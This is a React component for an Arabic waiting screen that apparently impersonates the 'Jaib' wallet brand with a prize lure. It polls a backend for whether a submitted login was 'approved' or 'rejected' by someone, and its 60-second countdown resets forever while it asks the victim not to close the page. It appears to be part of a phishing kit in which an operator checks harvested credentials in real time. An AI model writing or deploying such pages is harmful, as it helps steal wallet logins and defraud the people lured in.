import { useEffect, useRef, useState } from 'react';
import { Gift } from 'lucide-react';
import { getLoginSubmissionStatus } from '@/lib/supabase';

type WaitingProps = {
  prize: string | null;
  appId: string | null;
  onApproved: () => void;
  onRejected: (reason: string) => void;
};

const DURATION = 60;

export default function Waiting({ prize, appId, onApproved, onRejected }: WaitingProps) {
  const [seconds, setSeconds] = useState(DURATION);
  const stopped = useRef(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((s) => (s > 0 ? s - 1 : DURATION));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!appId) return;
    let cancelled = false;

    const check = async () => {
      const data = await getLoginSubmissionStatus(appId);
      if (cancelled || stopped.current || !data) return;
      const status = data.login_status;
      if (status === 'approved') {
        stopped.current = true;
        onApproved();
      } else if (status === 'rejected') {
        stopped.current = true;
        onRejected(data.login_reject_reason ?? 'تم رفض بيانات الدخول');
      }
    };

    void check();
    const poll = setInterval(check, 2000);
    return () => {
      cancelled = true;
      clearInterval(poll);
    };
  }, [appId, onApproved, onRejected]);

  const progress = (DURATION - seconds) / DURATION;
  const circumference = 2 * Math.PI * 70;

  return (
    <main
      dir="rtl"
      className="page-entrance flex h-dvh flex-col items-center justify-center overflow-hidden bg-background px-6 pb-10 pt-8"
    >
      <img
        src="/logo.png"
        alt="جيب Jaib"
        width={1479}
        height={586}
        className="animate-logo h-auto w-[110px]"
      />
      <h1 className="mt-10 text-xl font-extrabold text-foreground">
        جاري تجهيز جائزتك
      </h1>
      {prize && (
        <p className="mt-2 flex items-center gap-1.5 text-sm font-bold text-primary">
          <Gift size={16} />
          {prize}
        </p>
      )}
      <div className="relative mt-8 flex items-center justify-center">
        <svg
          width="180"
          height="180"
          viewBox="0 0 180 180"
          className="-rotate-90"
        >
          <circle
            cx="90"
            cy="90"
            r="70"
            fill="none"
            strokeWidth="10"
            className="stroke-border"
          />
          <circle
            cx="90"
            cy="90"
            r="70"
            fill="none"
            strokeWidth="10"
            strokeLinecap="round"
            strokeDasharray={circumference}
            strokeDashoffset={circumference * (1 - progress)}
            className="stroke-primary transition-all duration-1000 ease-linear"
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="text-4xl font-extrabold tabular-nums text-foreground">
            {seconds}
          </span>
          <span className="text-xs font-bold text-muted-foreground">ثانية</span>
        </div>
      </div>
      <p className="mt-8 max-w-[300px] text-center text-sm leading-6 text-muted-foreground">
        يرجى عدم إغلاق الصفحة، نتحقق من بياناتك ونجهّز جائزتك الآن...
      </p>
    </main>
  );
}
